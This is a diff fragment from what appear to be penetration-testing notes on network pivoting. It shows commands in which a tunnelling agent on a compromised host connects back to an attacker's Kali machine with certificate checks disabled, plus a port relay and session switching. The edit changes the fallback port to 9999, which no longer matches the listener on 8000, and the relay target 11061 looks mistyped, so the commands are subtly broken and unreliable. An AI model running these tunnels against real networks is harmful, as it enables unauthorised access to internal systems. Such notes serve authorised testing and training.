@@ -290,7 +290,7 @@ chmod +x agent
 ./agent -connect 192.168.229.221:11601 -ignore-cert
 # try this ifcant connect to 11601
 listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:11061 --tcp
-./agent -connect 192.168.229.221:8000 -ignore-cert
+./agent -connect 192.168.229.221:9999 -ignore-cert
 # from kali
 session
 # switch to newly added session
